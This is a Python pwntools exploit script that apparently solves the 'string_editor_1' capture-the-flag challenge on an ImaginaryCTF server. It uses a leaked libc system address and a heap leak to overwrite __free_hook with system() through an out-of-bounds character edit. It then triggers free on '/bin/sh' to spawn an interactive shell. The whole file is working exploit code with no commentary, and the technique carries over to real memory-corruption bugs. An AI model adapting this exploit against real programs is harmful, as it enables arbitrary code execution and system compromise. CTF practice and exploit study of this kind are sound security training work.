#!/usr/bin/env python3

from pwn import *

exe = ELF("./string_editor_1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("chal.imaginaryctf.org", 42004)

def s(offset, what):
    r.recvuntil("What character would you like to edit? (enter in 15 to get a fresh pallette)\n")
    r.sendline(str(offset))

    r.recvuntil("What character should be in that index?\n")
    r.sendline(str(what))

def s_q(offset, what):
    for i in range(len(what)):
        s(offset+i, what[i])


def main():
    
    r.recvuntil("But first, a word from our sponsors: ")
    system = int(r.recv(14), 16)
    libc.address = system - libc.sym['system']
    log.warn("Libc base 0x%x", libc.address) 

    s_q(0, "/bin/sh\x00")
    r.recvuntil("DEBUG: ")
    leak = int(r.recv(14), 16)
    log.warn("Heap leak @ 0x%x", leak)
    
    pause()
    log.warn("__free_hook 0x%x", libc.sym['__free_hook'])
    log.warn("Diff 0x%x", libc.sym['__free_hook'] - leak + 7)
    s_q(libc.sym['__free_hook'] - leak + 7, p64(system).decode("ISO-8859-1"))
    
    r.sendline("15")
    r.interactive()


if __name__ == "__main__":
    main()
